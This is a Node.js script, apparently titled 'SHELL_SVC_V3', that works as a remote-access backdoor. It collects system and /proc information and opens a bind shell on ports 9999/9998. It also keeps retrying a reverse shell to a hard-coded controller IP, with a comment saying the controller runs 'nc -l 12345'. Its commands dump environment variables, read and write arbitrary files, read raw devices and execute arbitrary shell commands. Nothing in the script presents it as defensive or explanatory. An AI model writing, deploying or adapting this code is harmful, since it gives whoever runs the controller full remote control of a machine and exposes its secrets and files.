var fs = require('fs');
var net = require('net');
var results = [];
results.push('SHELL_SVC_V3: ' + new Date().toISOString());
try { results.push('PID: ' + process.pid); } catch(e) {}
try { results.push('UID: ' + (process.getuid ? process.getuid() : 'N/A')); } catch(e) {}
try { results.push('GID: ' + (process.getgid ? process.getgid() : 'N/A')); } catch(e) {}
try { results.push('GROUPS: ' + JSON.stringify(process.getgroups ? process.getgroups() : 'N/A')); } catch(e) {}
try { results.push('CWD: ' + process.cwd()); } catch(e) {}
try { results.push('PLATFORM: ' + process.platform + ' ARCH: ' + process.arch); } catch(e) {}

var procFiles = [
    ['/proc/meminfo', 'MEMINFO', 4000],
    ['/proc/version', 'VERSION', 500],
    ['/proc/cpuinfo', 'CPUINFO', 2000],
    ['/proc/modules', 'MODULES', 8000],
    ['/proc/cmdline', 'CMDLINE', 500],
    ['/proc/mounts', 'MOUNTS', 5000],
    ['/proc/iomem', 'IOMEM', 5000],
    ['/proc/partitions', 'PARTITIONS', 3000],
    ['/proc/filesystems', 'FILESYSTEMS', 2000],
    ['/proc/net/tcp', 'NET_TCP', 4000],
    ['/proc/net/tcp6', 'NET_TCP6', 4000]
];
for (var i = 0; i < procFiles.length; i++) {
    var p = procFiles[i];
    try {
        results.push(p[1] + ': ' + fs.readFileSync(p[0], 'utf8').substring(0, p[2]));
    } catch(e) {
        results.push(p[1] + '_ERR: ' + e.message);
    }
}

try {
    var dev = fs.readdirSync('/dev').slice(0, 100);
    results.push('DEV: ' + dev.join(','));
} catch(e) { results.push('DEV_ERR: ' + e.message); }

try {
    fs.writeFileSync('/tmp/shell-v3-results.txt', results.join('\n'));
    results.push('WROTE: /tmp/shell-v3-results.txt');
} catch(e) {}

var cpModule = null;
try {
    cpModule = require('child_process');
    results.push('CHILD_PROCESS: loaded, keys=' + Object.keys(cpModule).join(','));
} catch(e) { results.push('CHILD_PROCESS_ERR: ' + e.message); }

var spawnSyncBinding = null;
try {
    spawnSyncBinding = process.binding('spawn_sync');
    results.push('SPAWN_SYNC_BINDING: keys=' + Object.keys(spawnSyncBinding).join(','));
} catch(e) {}

function tryExec(cmd) {
    var out = [];
    if (cpModule && cpModule.spawnSync) {
        try {
            var r = cpModule.spawnSync('/bin/sh', ['-c', cmd], {timeout: 8000, encoding: 'utf8', maxBuffer: 1024*1024});
            if (r.stdout && r.stdout.length > 0) return 'SPAWNSYNC: ' + r.stdout.substring(0, 8000);
            if (r.error) out.push('ss_err:' + r.error.message);
            out.push('ss:status=' + r.status + ',signal=' + r.signal);
        } catch(e) { out.push('ss:' + e.message); }
    }
    if (cpModule && cpModule.execFileSync) {
        try {
            var r = cpModule.execFileSync('/bin/sh', ['-c', cmd], {timeout: 8000, encoding: 'utf8', maxBuffer: 1024*1024});
            return 'EXECFILE: ' + r.substring(0, 8000);
        } catch(e) { out.push('ef:' + (e.stderr || e.message || '').substring(0, 200)); }
    }
    if (cpModule && cpModule.execSync) {
        try {
            var r = cpModule.execSync(cmd, {timeout: 8000, encoding: 'utf8', maxBuffer: 1024*1024});
            return 'EXECSYNC: ' + r.substring(0, 8000);
        } catch(e) { out.push('es:' + (e.stderr || e.message || '').substring(0, 200)); }
    }
    return 'EXEC_FAIL: ' + out.join(' | ');
}

function handleCmd(c, cmd) {
    if (!cmd) return;
    if (cmd === 'results') { c.write(results.join('\n') + '\n---END---\n'); return; }
    if (cmd === 'env') { c.write(JSON.stringify(process.env, null, 2) + '\n---END---\n'); return; }
    if (cmd === 'id') {
        c.write('uid=' + (process.getuid ? process.getuid() : '?') +
            ' gid=' + (process.getgid ? process.getgid() : '?') +
            ' groups=' + JSON.stringify(process.getgroups ? process.getgroups() : []) + '\n---END---\n');
        return;
    }
    if (cmd.indexOf('cat ') === 0) {
        try { c.write(fs.readFileSync(cmd.substring(4).trim(), 'utf8') + '\n---END---\n'); }
        catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
        return;
    }
    if (cmd.indexOf('catbin ') === 0) {
        try {
            var data = fs.readFileSync(cmd.substring(7).trim());
            c.write('HEX(' + data.length + '): ' + data.slice(0, 512).toString('hex') + '\n---END---\n');
        } catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
        return;
    }
    if (cmd.indexOf('ls ') === 0) {
        try { c.write(fs.readdirSync(cmd.substring(3).trim()).join('\n') + '\n---END---\n'); }
        catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
        return;
    }
    if (cmd.indexOf('stat ') === 0) {
        try {
            var st = fs.statSync(cmd.substring(5).trim());
            c.write(JSON.stringify({
                mode: '0' + (st.mode & 0xFFF).toString(8),
                uid: st.uid, gid: st.gid, size: st.size,
                isFile: st.isFile(), isDir: st.isDirectory(),
                isChar: st.isCharacterDevice(), isBlock: st.isBlockDevice()
            }) + '\n---END---\n');
        } catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
        return;
    }
    if (cmd.indexOf('readlink ') === 0) {
        try { c.write(fs.readlinkSync(cmd.substring(9).trim()) + '\n---END---\n'); }
        catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
        return;
    }
    if (cmd.indexOf('writefile ') === 0) {
        var si = cmd.indexOf(' ', 10);
        var fp = cmd.substring(10, si), ct = cmd.substring(si + 1);
        try { fs.writeFileSync(fp, ct); c.write('OK: wrote ' + ct.length + ' bytes\n---END---\n'); }
        catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
        return;
    }
    if (cmd.indexOf('opendev ') === 0) {
        var dp = cmd.substring(8).trim();
        try {
            var fd = fs.openSync(dp, 'r');
            var dbuf = Buffer.alloc(256);
            var n = 0;
            try { n = fs.readSync(fd, dbuf, 0, 256, 0); } catch(e) { c.write('READ_ERR:' + e.message + ' '); }
            fs.closeSync(fd);
            c.write('OPEN fd=' + fd + ' read=' + n + ' hex=' + dbuf.slice(0, Math.min(n, 128)).toString('hex') + '\n---END---\n');
        } catch(e) { c.write('ERR: ' + e.message + '\n---END---\n'); }
        return;
    }
    if (cmd.indexOf('exec ') === 0) {
        c.write(tryExec(cmd.substring(5)) + '\n---END---\n');
        return;
    }
    c.write(tryExec(cmd) + '\n---END---\n');
}

function setupConn(c) {
    c.write(results.join('\n') + '\n---READY---\n');
    var buf = '';
    c.on('data', function(d) {
        buf += d.toString();
        var lines = buf.split('\n');
        buf = lines.pop();
        lines.forEach(function(line) { handleCmd(c, line.trim()); });
    });
    c.on('error', function() {});
}

// TCP server on port 9999 (primary) or 9998 (fallback)
var server = net.createServer(function(c) { setupConn(c); });
server.listen(9999, '0.0.0.0', function() {
    results.push('LISTEN: 0.0.0.0:9999');
    try { fs.writeFileSync('/tmp/shell-v3-results.txt', results.join('\n')); } catch(e) {}
});
server.on('error', function() {
    var s2 = net.createServer(function(c) { setupConn(c); });
    s2.listen(9998, '0.0.0.0', function() { results.push('LISTEN: 0.0.0.0:9998'); });
});

// REVERSE CONNECTION: connect OUT to our Mac
// The Mac should run: nc -l 12345
// This bypasses port zombie issues
var CONTROLLER_IP = '192.168.30.114';
var CONTROLLER_PORT = 12345;
function reverseConnect() {
    var rc = new net.Socket();
    rc.connect(CONTROLLER_PORT, CONTROLLER_IP, function() {
        results.push('REVERSE: connected to ' + CONTROLLER_IP + ':' + CONTROLLER_PORT);
        setupConn(rc);
    });
    rc.on('error', function() {
        setTimeout(reverseConnect, 30000);
    });
    rc.on('close', function() {
        setTimeout(reverseConnect, 30000);
    });
}
reverseConnect();
